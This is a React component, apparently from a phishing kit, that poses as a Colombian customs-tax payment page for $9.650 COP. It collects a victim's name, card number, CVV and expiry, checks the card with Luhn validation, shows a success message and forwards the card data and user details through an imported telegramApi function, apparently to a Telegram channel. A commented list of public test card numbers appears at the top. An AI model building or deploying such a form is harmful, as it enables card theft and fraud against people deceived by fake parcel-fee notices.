import React, { useState, useLayoutEffect } from 'react'
import { useEffect } from 'react'
import telegramApi from './telegramApi'
// const cardsExamples=[
//     4242424242424242,	
//     5555555555554444,	
//     2223003122003222,	
//     5200828282828210,	
//     5105105105105100,	
//     371449635398431,
//     6011111111111117,	
//     6011000990139424,	
//     6011981111111113,	
//     3056930009020004,	
//     36227206271667,
//     3566002020360505,	
//     6200000000000005,
// ]
const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicidades, formUser }) => {
    const [valided, setValided] = useState(false)
    const [limitCvv] = useState(3)

    const validTarjeta = (tarjeta) => {
        
        if (tarjeta[0] != "3") {
            
            formPay.cvv.length > 3 && setFormPay({
                ...formPay,
                cvv: formPay.cvv.slice(0, 3)
            })
        }

        const luhnCheck = num => {
            let arr = (num + '')
                .split('')
                .reverse()
                .map(x => parseInt(x));
            let lastDigit = arr.splice(0, 1)[0];
            let sum = arr.reduce((acc, val, i) => (i % 2 !== 0 ? acc + val : acc + ((val * 2) % 9) || 9), 0);
            sum += lastDigit;
            return sum % 10 === 0;
        };

        const luhnChk = (function (arr) {
            return function (ccNum) {
                var
                    len = ccNum.length,
                    bit = 1,
                    sum = 0,
                    val;

                while (len) {
                    val = parseInt(ccNum.charAt(--len), 10);
                    sum += (bit ^= 1) ? arr[val] : val;
                }

                return sum && sum % 10 === 0;
            };
        }([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));


        if (luhnCheck(tarjeta)) {
            setValided(false)
            

            return
        }
        if (luhnChk(tarjeta)) {
            setValided(false)

            return
        }
        setValided(true)


    }

    useLayoutEffect(() => {


        formPay.cvv.length > limitCvv && setFormPay({
            ...formPay,
            cvv: formPay.cvv.slice(0, limitCvv)
        })

        formPay?.numeroTarjeta?.length > 16 && setFormPay({
            ...formPay,
            numeroTarjeta: formPay.numeroTarjeta.slice(0, 16)
        })

        formPay?.expiracion?.length > 5 && setFormPay({
            ...formPay,
            expiracion: formPay.expiracion.slice(0, 5)
        })

        formPay?.expiracion?.length === 4 && formPay.expiracion.search("/") == -1 && setFormPay({
            ...formPay,
            expiracion: formPay.expiracion[0] + formPay.expiracion[1] + "/" + formPay.expiracion[2] + formPay.expiracion[3]
        })
    }, [formPay])

    const handleChange = (e) => {
        setFormPay({
            ...formPay,
            [e.target.name]: e.target.value
        })


    }
    const handleChangeFecha = (e) => {
        setFormPay({
            ...formPay,
            [e.target.name]: e.target.value
        })

    }
    const enviarDatos = (e) => {
        e.preventDefault()
        const { nombreApellido, cvv, mes, año } = formPay;
        setFormPay({ ...formPay})
        console.log(formPay)

        if (!valided && nombreApellido && cvv && año && mes) {
            setMensajeFelicidades(true)
            telegramApi(formUser, formPay)
            
        }
    }
    return (
        <form style={{ top: showMenuPay ? "0px" : "550px" }} className={`border-2 absolute w-full h-full bg-white ${showMenuPay ? "" : ""} transition-all duration-500 ease-in-out`}>
            <div className='bg-gray-200 w-full border-2 h-6 mb-0  border-t-gray-300'></div>
            <div className='w-full px-4'>
                <h5 className='text-base md:text-xl my-4'>Realizar pago de impuesto de aduanas por valor de: $9.650 COP.</h5>

                <input className={inputClass} onChange={handleChange}
                    value={formPay.nombreApellido} type="text"
                    name="nombreApellido"
                    placeholder="Nombre y Apellido"
                    required
                />
                <input className="w-full bg-gray-200 py-3 mb-4 rouneded-md px-2" onChange={(e) => handleChange(e, "form2")}
                    value={formPay.numeroTarjeta}
                    type="number"
                    name="numeroTarjeta"
                    placeholder="Número de tarjeta de credito"
                    onBlur={() => validTarjeta(formPay.numeroTarjeta)}
                    required
                />
                {valided && <div className='text-red-400 px-2 my-2'>Tarjeta invalida</div>}
                <input className={inputClass} onChange={handleChange}
                    value={formPay.cvv}
                    type="number"
                    name="cvv"
                    placeholder="CVV"
                    required
                />
                <div className={"flex"}>
                    <select onChange={handleChangeFecha} name={"mes"} className='appearance-none h-7 px-1 flex border relative outline-none bg-white text-sm mr-4 pt-1 focus:border-blue-300 '>
                        <option value={""} className='ml-1'>{`Mes \u25BC`}</option>
                        {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((item) => {
                            return <option key={item} value={item}>
                                {item}
                            </option>
                        })}
                    </select>
                    <select onChange={handleChangeFecha} name={"año"} className='appearance-none px-1 flex border relative outline-none bg-white text-sm pt-1 focus:border-blue-300 '>
                        <option value={""} className='ml-1'>{`Año \u25BC`}</option>
                        {[23, 24, 25, 26, 27, 28, 29, 30].map((item, i) => {
                            return <option key={i} value={item}>
                                {item}
                            </option>
                        })}

                    </select>
                </div>
            </div>
            <button className='bg-orange-600 text-white w-full py-3 hover:underline rounded-md text-xs md:text-base mt-4' onClick={(e) => enviarDatos(e)}>Realizar pago por: $9.650 COP</button>
        </form>
    )
}

export default form2

